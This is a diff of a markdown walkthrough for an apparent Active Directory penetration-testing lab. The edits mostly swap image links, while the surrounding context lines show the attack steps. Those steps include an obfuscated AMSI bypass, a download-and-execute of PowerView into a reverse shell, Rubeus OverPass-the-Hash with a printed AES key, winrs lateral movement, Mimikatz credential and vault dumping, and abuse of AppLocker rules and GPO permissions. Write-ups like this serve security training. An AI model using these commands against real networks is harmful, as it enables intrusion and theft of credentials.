@@ -610,17 +610,20 @@ sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domai
 
 **icacls Displays or modifies discretionary access control lists (DACLs) on specified files and applies stored DACLs to files in specified directories**
 
-![alt text](image-25.png)
+<img width="1313" height="517" alt="image" src="https://github.com/user-attachments/assets/712ba039-6758-4c48-a46f-95cf3a313e90" />
+
 
 ### Verify if the gPCfileSysPath has been modified for the DevOps Policy.
 
 * Get-DomainGPO -Identity 'DevOps Policy'
 
 ### Before
-![alt text](image-26.png)
+<img width="1173" height="271" alt="image" src="https://github.com/user-attachments/assets/88ae85eb-9494-4b6a-8982-fd4b3c7f45e1" />
+
 
 ### After
-![alt text](image-27.png)
+<img width="1363" height="281" alt="image" src="https://github.com/user-attachments/assets/7482a568-16f2-40b9-8580-9fca7dbf1712" />
+
 
 **After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci**
 
@@ -632,7 +635,8 @@ USERNAME=student731
 
 * winrs -r:dcorp-ci cmd
 
-![alt text](image-28.png)
+<img width="1106" height="424" alt="image" src="https://github.com/user-attachments/assets/3f1593f9-0312-45b6-908f-bac459979078" />
+
 
 ## Objective 7
 ```
@@ -669,7 +673,7 @@ dcorp-adminsrv  dcorp\websvc        True
 
 **There is a domain admin (svcadmin) session on dcorp-mgmt server! We do not have access to the server but that comes late**
 
-![alt text](image-29.png)
+<img width="1590" height="290" alt="image" src="https://github.com/user-attachments/assets/cf5aad61-619e-4274-8d52-97b7bd43f9d7" />
 
 ### We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
 **We can use Powerview’s Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging**
@@ -681,18 +685,21 @@ dcorp-adminsrv  dcorp\websvc        True
 S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
-![alt text](image-30.png)
+<img width="1352" height="288" alt="image" src="https://github.com/user-attachments/assets/08e48a78-7f8b-4b35-a665-113ec1a794b1" />
+
 
 **Now, download and execute PowerView in memory of the reverse shell and run Find-DomainUserLocation. Check all the machines in the domain**
 
 * iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.31/PowerView.ps1'))
 * Find-DomainUserLocation
 
-![alt text](image-32.png)
+<img width="1335" height="334" alt="image" src="https://github.com/user-attachments/assets/f7564c86-9a68-43e9-b248-0186d48210a3" />
+
 
 **There is a domain admin session on dcorp-mgmt server**
 
-![alt text](image-49.png)
+<img width="1014" height="557" alt="image" src="https://github.com/user-attachments/assets/2769349d-b695-4a69-b6c1-5a4c8afcf315" />
+
 
 **Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open**
 
@@ -745,9 +752,11 @@ SID : S-1-5-21-719815819-3726368948-3917688648-1118
  rc4_hmac_old_exp b38ff50264b74508085d82c69794a4d8
 ```
 
-![alt text](image-33.png)
+<img width="1375" height="623" alt="image" src="https://github.com/user-attachments/assets/71e6b8c1-066d-42c6-8232-0520dfb74275" />
 
-![alt text](image-34.png)
+
+<img width="1353" height="849" alt="image" src="https://github.com/user-attachments/assets/4d28b5b0-3438-4b2a-b316-0c6f361aadc6" />
+
 
 ```
 [snip]
@@ -777,7 +786,8 @@ SID : S-1-5-21-719815819-3726368948-3917688648-1118
 ### Find the proccess is using svcadmin account.
 * $null | winrs -r:dcorp-mgmt "cmd /c tasklist /V | findstr "svcadmin"
 
-![alt text](image-35.png)
+<img width="1799" height="82" alt="image" src="https://github.com/user-attachments/assets/5e1e3e69-90dd-493a-98de-870c21ad30bd" />
+
 
 ### OverPass-the-Hash to replay svcadmin credentials
 **use OverPass-the-Hash to use svcadmin's credentials**
@@ -786,7 +796,8 @@ SID : S-1-5-21-719815819-3726368948-3917688648-1118
 
 * C:\Windows\system32>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 
-![alt text](image-36.png)
+<img width="1209" height="725" alt="image" src="https://github.com/user-attachments/assets/54808233-cb5f-4241-bd0e-8a0024cc5fb2" />
+
 
 ### Try accessing the domain controller from the new process
 * C:\Windows\system32>winrs -r:dcorp-dc cmd /c set username
@@ -794,7 +805,8 @@ SID : S-1-5-21-719815819-3726368948-3917688648-1118
 USERNAME=svcadmin`
 ```
 
-![alt text](image-37.png)
+<img width="1320" height="151" alt="image" src="https://github.com/user-attachments/assets/1a035edd-594c-4dde-ac3d-0e24301857a6" />
+
 
 **Note that we did not need to have direct access to dcorp-mgmt from the student VM.**
 
@@ -829,7 +841,8 @@ HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script
 
 **We can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else**
 
-![alt text](image-38.png)
+<img width="1343" height="210" alt="image" src="https://github.com/user-attachments/assets/aec389e6-b76c-4e50-9174-0fe097f0210f" />
+
 
 **However, this particular rule is overly permissive**
 
@@ -869,7 +882,8 @@ UserOrGroupSid : S-1-1-0
 Action : Allow
 ```
 
-![alt text](image-39.png)
+<img width="1375" height="746" alt="image" src="https://github.com/user-attachments/assets/166eec3b-de53-4c98-8a1e-fed6e488538e" />
+
 
 **"Everyone" can run scripts from the Program Files directory. That means, we can drop scripts in the Program Files directory there and execute them**
 
@@ -904,11 +918,13 @@ Invoke-Mimi -Command $Pwn
 
 * [dcorp-adminsrv]: PS C:\Program Files> ls
 
-![alt text](image-40.png)
+<img width="1281" height="467" alt="image" src="https://github.com/user-attachments/assets/2a727e92-a9c7-43bd-9161-6f7d11f1c68d" />
+
 
 * [dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> .\Invoke-MimiEx-keys-std731.ps1
 
-![alt text](image-41.png)
+<img width="886" height="918" alt="image" src="https://github.com/user-attachments/assets/94defa0b-4338-4cd8-9b73-22afd31335d4" />
+
 
 ```
 Authentication Id : 0 ; 139020 (00000000:00021f0c)
@@ -986,7 +1002,7 @@ your student ID).
 "Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"' " (without quotes).
 </p>
 
-![alt text](image-42.png)
+<img width="1075" height="384" alt="image" src="https://github.com/user-attachments/assets/8ce7911a-7bad-4312-9cfe-5259f220d797" />
 
 ### Copy Invoke-MimiEx-vault-stdx.ps1 to dcorp-adminsrv and run it
 
@@ -1231,9 +1247,9 @@ SID               : S-1-5-18
 
 <p>Recall that we enumerated that studentx has Full Control/Generic All on the Applocked Group Policy. Let's make changes to the Group Policy and disable Applocker on dcorp-adminsrv.</p>
 
-![alt text](image-43.png)
+<img width="1801" height="796" alt="image" src="https://github.com/user-attachments/assets/087814bd-79e3-4715-9ee3-f0c017ed15e5" />
 
-![alt text](image-44.png)
+<img width="1803" height="601" alt="image" src="https://github.com/user-attachments/assets/413e2ea5-789f-4f32-99f7-8e7cf51d842f" />
 
 <p>We need the Group Policy Management Console for this. 
 As the student VM is a Server 2022 machine, we can install it using the following steps: 
@@ -1254,19 +1270,21 @@ Attempting to start cmd as user "dcorp\studentx" ...
 <p>In gpmc, expand Forest -> Domains -> dollarcorp.moneycorp.local -> Applocked -> Right click on the 
 Applocker policy and click on Edit.</p>
 
-![alt text](image-45.png)
+<img width="726" height="718" alt="image" src="https://github.com/user-attachments/assets/2a8540dd-7823-45a7-aa41-fe66e787d5fe" />
+
 
 <p>In the new window, Expand Policies -> Windows Settings -> Security Settings -> Application Control 
 Policies -> Applocker.</p>
 
-![alt text](image-46.png)
+<img width="713" height="706" alt="image" src="https://github.com/user-attachments/assets/d1563aab-d74b-4880-96df-50e1518e57fe" />
+
 
 <p>Start looking at each category of the Applocker policies.</p>
 
 * 1 - In the 'Executable Rules', 'Everyone' is allowed to run Microsoft signed binaries. 
 * 2 - In the 'Script Rules', 'Everyone' can run Microsoft signed scripts from any location and two default rules where 'Everyone' can run Microsoft signed scripts from 'C:\Windows' and 'C:\Program Files' folders. 
 
-![alt text](image-47.png)
+<img width="1114" height="387" alt="image" src="https://github.com/user-attachments/assets/f7c4ad99-5cf5-4640-a62c-c6d1a3fffabe" />
 
 <p>We can either wait for the Group Policy refresh or force an update on the dcorp-adminsrv machine.</p>
 
